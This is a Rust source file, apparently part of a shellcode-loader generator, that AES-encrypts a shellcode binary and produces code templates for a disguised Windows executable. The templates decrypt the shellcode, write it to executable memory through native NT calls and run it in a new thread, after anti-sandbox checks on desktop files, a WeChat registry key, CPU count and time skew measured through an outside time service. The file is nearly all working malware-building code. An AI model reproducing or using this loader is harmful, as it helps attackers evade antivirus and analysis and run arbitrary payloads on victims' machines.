#![allow(warnings)]
use aes::cipher::{block_padding::Pkcs7, BlockDecryptMut, BlockEncryptMut, KeyIvInit};
use base64::{decode, encode};
use rand_core::{OsRng, RngCore};
use std::fs;
use std::fs::File;
use std::io;
use std::io::prelude::*;
use std::u8;

type Aes128CbcEnc = cbc::Encryptor<aes::Aes128>;
type Aes128CbcDec = cbc::Decryptor<aes::Aes128>;

use std::io::{BufRead, BufReader, Read};

pub fn maincargo() -> String {
    format!(
        r#"
winapi = {{version = "0.3.9", features = ["winnt","winbase", "memoryapi", "winuser", "wincon", "winbase"]}}
ntapi = "0.4.0"
cbc = "0.1.2"
rand_core = {{ version = "0.6", features = ["std"] }}
aes = "0.8"
base64 = "0.21.0"
dirs = "3.0"
winreg = "0.9"
reqwest = {{ version = "0.11",features = ["blocking","json"] }}


[build-dependencies]
winres = "0.1"

[profile.release]
panic = "abort"
lto = true
incremental = false
codegen-units = 1
opt-level = "z"
debug = false"#
    )
}

pub fn aesdecryption() -> String {
    format!(
        r#"fn decrypt() -> Vec<u8> {{
        unsafe {{
            let cipher = base64::decode(&ciphertext).unwrap();
            let key_var = base64::decode(&key).unwrap();
            let iv_var = base64::decode(&iv).unwrap();
            let cipher_len = cipher.len();
            let mut buf = [0u8;  0x50000];
            buf[..cipher_len].copy_from_slice(&cipher);
            let pt = Aes128CbcDec::new_from_slices(&key_var, &iv_var).expect("error")
                .decrypt_padded_b2b_mut::<Pkcs7>(&cipher, &mut buf)
                .unwrap();
        
            pt.to_vec()
        }}
    }}
    "#
    )
}

pub fn main_imports() -> String {
    format!(
        r#"#![allow(warnings)]
#![windows_subsystem = "windows"]
use aes::cipher::{{block_padding::Pkcs7, BlockDecryptMut, KeyIvInit}};
use ntapi::ntmmapi::{{NtAllocateVirtualMemory, NtProtectVirtualMemory, NtWriteVirtualMemory}};
use ntapi::ntobapi::NtWaitForSingleObject;
use ntapi::ntpsapi::{{NtCreateThreadEx, NtCurrentProcess}};
use std::ptr;
use winapi::ctypes::c_void;
use winapi::um::winnt::MAXIMUM_ALLOWED;
type Aes128CbcDec = cbc::Decryptor<aes::Aes128>;
use base64::engine::{{general_purpose, Engine as _}};
use std::u8;
use dirs::home_dir;
use reqwest;
use winreg::HKEY;
use std::collections::HashMap;
use std::ffi::OsString;
use std::fs;
use std::process;
use std::thread;
use std::time::Duration;
use winreg::enums::*;
use winreg::RegKey;

"#
    )
}

pub fn ntloader() -> String {
    format!(
        r#"fn ntloader() -> (){{
        unsafe {{
            let mut s = decrypt();
            let mut base_address : *mut c_void = ptr::null_mut();
            let mut sellcode_length: usize =  s.len().try_into().unwrap();
            let mut temp = 0;
            NtAllocateVirtualMemory(NtCurrentProcess,&mut base_address,0, &mut s.len(), 0x00003000, 0x40);
            NtWriteVirtualMemory(NtCurrentProcess,base_address,s.as_ptr() as _,s.len() as usize,ptr::null_mut());
            NtProtectVirtualMemory(NtCurrentProcess, &mut base_address, &mut sellcode_length,  0x20, &mut temp);
            let mut thread_handle : *mut c_void = std::ptr::null_mut();
            NtCreateThreadEx(&mut thread_handle, MAXIMUM_ALLOWED, std::ptr::null_mut(), NtCurrentProcess, base_address, std::ptr::null_mut(), 0, 0, 0, 0, std::ptr::null_mut());
            NtWaitForSingleObject(thread_handle, 0, std::ptr::null_mut());
    }}
}}
    "#
    )
}

pub fn anti_s() -> String {
    format!(
        r#"
fn count_files_in_dir(dir_path: &str) -> Result<usize, std::io::Error> {{
    let entries = fs::read_dir(dir_path)?;

    let mut count = 0;
    for _ in entries {{
        count += 1;
    }}

    Ok(count)
}}

fn check_desktop() -> i32 {{
    if let Some(mut home_dir) = home_dir() {{
        home_dir.push("Desktop");
        match count_files_in_dir(home_dir.to_str().unwrap()) {{
            Ok(file_count) => {{
                println!("用户桌面文件数：{{}}", file_count);
                if file_count < 7 {{
                    1
                }} else {{
                    0
                }}
            }}
            Err(err) => {{
                eprintln!("无法读取用户桌面文件列表：{{}}", err);
                0
            }}
        }}
    }} else {{
        eprintln!("无法获取用户主目录");
        0
    }}
}}

fn check_wechat_exist() -> i32 {{
    let key_path = r"SOFTWARE\Tencent\bugReport\WechatWindows";
    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);

    match hklm.open_subkey_with_flags(key_path,KEY_QUERY_VALUE) {{
        Ok(reg_key) => match reg_key.get_value::<String, _>("InstallDir") {{
            Ok(install_path) => {{
                let install_path_str: OsString = install_path.into();
                let install_path_str = install_path_str.to_string_lossy();

                println!("微信安装路径: {{}}", install_path_str);
                0
            }}
            Err(err) => {{
                eprintln!("无法获取注册表键值：{{}}", err);
                1
            }}
        }},
        Err(err) => {{
            eprintln!("无法打开注册表子键：{{}}", err);
            1
        }}
    }}
}}

fn check_timestamp() -> Result<i32, reqwest::Error> {{
    let res = reqwest::blocking::get("https://quan.suning.com/getSysTime.do")?
        .json::<HashMap<String, String>>()?;
    let start:i64 = res.get("sysTime1").unwrap().parse().unwrap();
    thread::sleep(Duration::from_secs(3));
    let res = reqwest::blocking::get("https://quan.suning.com/getSysTime.do")?
        .json::<HashMap<String, String>>()?;
    let end:i64 = res.get("sysTime1").unwrap().parse().unwrap();
   
    if end - start < 3 {{
       Ok(1)
    }} else {{
        Ok(0)
    }}
}}

fn checke_cpu() -> i32 {{
    let num = 2;
    let hklm: HKEY = HKEY_LOCAL_MACHINE;
    let subkey = r"SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment";
    let cpu = RegKey::predef(hklm).open_subkey(subkey)
        .and_then(|keyval| keyval.get_value("NUMBER_OF_PROCESSORS").map(|v: String| v))
        .unwrap_or_else(|_| "".to_string());
    println!("[*] The number of CPUs is: {{}}", cpu);
    if cpu.parse::<i32>().unwrap() <= num {{
        1
    }} else {{
        0
    }}
}}



fn anti_s() {{
    let r1 = check_desktop();
    let r2 = check_wechat_exist();
    let r3 = check_timestamp().unwrap();
    let r4 = checke_cpu();
    if r1 + r2 + r3 + r4 >= 3 {{
        std::process::exit(0)
    }}
}}


"#
    )
}

pub fn main_() -> String {
    format!(
        r#"fn main(){{
        anti_s();
        ntloader();
    }}
    "#
    )
}

pub fn build_() -> String {
    format!(
        r#"
use std::io;
#[cfg(windows)]
use winres::WindowsResource;

fn main() -> io::Result<()> {{
    #[cfg(windows)]
    {{
        WindowsResource::new()
            .set_icon("../icon.ico")
            .compile()?;
    }}
    Ok(())
}}

"#
    )
}

pub fn read_bin(file_name: &str) -> Vec<u8> {
    if let Ok(buffer) = fs::read(file_name) {
        buffer
    } else {
        println!("读取文件失败: {}", file_name);
        Vec::new() // 或者根据需要返回一个默认值
    }
}

pub fn encrypt(plain: &[u8], iv_var: &[u8], key_var: &[u8]) -> Vec<u8> {
    let mut buf = [0u8; 0x50000];
    let pt_len = plain.len();
    buf[..pt_len].copy_from_slice(plain);
    let ct = Aes128CbcEnc::new_from_slices(&key_var, &iv_var)
        .expect("error")
        .encrypt_padded_b2b_mut::<Pkcs7>(plain, &mut buf)
        .unwrap();
    ct.to_vec()
}

/// 生成随机 iv
pub fn generate_iv() -> [u8; 16] {
    let mut rng = OsRng;
    let mut bytes = [0u8; 16];
    rng.fill_bytes(&mut bytes);

    bytes
}
// 加密shellcode
pub fn encipher_bin(buffer: &[u8]) -> (String, String, String) {
    let iv = generate_iv();
    let key = generate_iv();
    let ret = encrypt(buffer, &iv, &key);
    let base64_encoded = base64::encode(&ret);
    let iv_base64 = base64::encode(&iv);
    let key_base64 = base64::encode(&key);
    (base64_encoded, iv_base64, key_base64)
}
